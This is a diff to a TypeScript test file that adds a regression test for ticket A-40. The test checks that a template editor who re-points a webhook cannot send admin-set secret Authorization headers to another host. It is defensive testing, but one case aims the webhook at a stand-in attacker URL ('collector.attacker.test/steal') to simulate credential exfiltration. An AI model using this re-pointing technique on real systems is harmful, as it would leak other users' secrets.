@@ -1,5 +1,8 @@
 import { strict as assert } from 'node:assert';
+import { createServer, type Server } from 'node:http';
+import type { AddressInfo } from 'node:net';
 import { after, before, beforeEach, describe, it } from 'node:test';
+import { WebhookTransport } from '../src/notifications/delivery/webhook.js';
 import { MessageContextLoader } from '../src/notifications/context.js';
 import type { OutgoingMessage } from '../src/notifications/delivery/transport.js';
 import { NotificationTester } from '../src/notifications/test-send.js';
@@ -15,7 +18,7 @@ import {
   databaseAvailable,
   type ScratchDatabase,
 } from './support/database.js';
-import { buildHarness, silent, testActor, type Harness } from './support/tree.js';
+import { actorNamed, buildHarness, silent, testActor, type Harness } from './support/tree.js';
 
 const available = await databaseAvailable();
 
@@ -391,6 +394,90 @@ describe(
         const unsaved = await templates.previewDraft(draft, sensorId, Visibility.EVERYTHING);
         assert.equal(unsaved.subject, saved.subject);
         assert.equal(unsaved.body, saved.body);
+      });
+    });
+
+    /**
+     * A template re-pointed by somebody who may edit it (`A-40`), through the real webhook
+     * transport to a real receiver. Editing a template needs `write`, and a writer never sees the
+     * secret headers an administrator set. Before this ticket they could still send them anywhere:
+     * change the URL, leave the headers out, press "test".
+     */
+    describe('a webhook template re-pointed by its editor (A-40)', () => {
+      let receiver: Server;
+      let port = 0;
+      let arrived: { path: string; authorization: string | undefined }[] = [];
+
+      before(async () => {
+        receiver = createServer((request, response) => {
+          arrived.push({ path: request.url ?? '', authorization: request.headers.authorization });
+          request.resume();
+          request.on('end', () => response.writeHead(204).end());
+        });
+        await new Promise<void>((resolve) => receiver.listen(0, '127.0.0.1', resolve));
+        port = (receiver.address() as AddressInfo).port;
+      });
+
+      after(async () => {
+        await new Promise<void>((resolve) => {
+          receiver.close(() => {
+            resolve();
+          });
+        });
+      });
+
+      beforeEach(() => {
+        arrived = [];
+      });
+
+      // Every name resolves to the receiver above, so "another host" is another name and path.
+      const webhook = new WebhookTransport({
+        config: { targetPolicy: 'link-local', maxRedirects: 0, userAgent: 'ms-core-test' },
+        logger: silent,
+        resolve: () => Promise.resolve(['127.0.0.1']),
+      });
+      const at = (host: string, path: string): string => `http://${host}:${String(port)}${path}`;
+      const editor = actorNamed('writer');
+
+      async function pager(): Promise<number> {
+        return (
+          await templates.create(testActor, {
+            name: `Pager-${String(process.hrtime.bigint())}`,
+            method: 'webhook',
+            settings: {
+              url: at('pager.example.test', '/hook'),
+              secretHeaders: { authorization: 'Bearer set-by-an-admin' },
+            },
+            summarisation: 'always-immediate',
+          })
+        ).id;
+      }
+
+      it('sends the secret where it was set to go', async () => {
+        // The control: without it, a receiver that saw no secret could mean none was ever sent.
+        const templateId = await pager();
+        await templates.update(editor, templateId, {
+          name: 'Pager, renamed',
+          method: 'webhook',
+          settings: { url: at('pager.example.test', '/hook') },
+          summarisation: 'always-immediate',
+        });
+        const report = await testerWith(webhook).send(editor, { templateId, sensorId });
+        assert.equal(report.delivered, true, report.error ?? '');
+        assert.deepEqual(arrived, [{ path: '/hook', authorization: 'Bearer set-by-an-admin' }]);
+      });
+
+      it('sends no secret to where an editor re-pointed it', async () => {
+        const templateId = await pager();
+        await templates.update(editor, templateId, {
+          name: 'Pager',
+          method: 'webhook',
+          settings: { url: at('collector.attacker.test', '/steal') },
+          summarisation: 'always-immediate',
+        });
+        const report = await testerWith(webhook).send(editor, { templateId, sensorId });
+        assert.equal(report.delivered, true, report.error ?? '');
+        assert.deepEqual(arrived, [{ path: '/steal', authorization: undefined }]);
       });
     });
   },
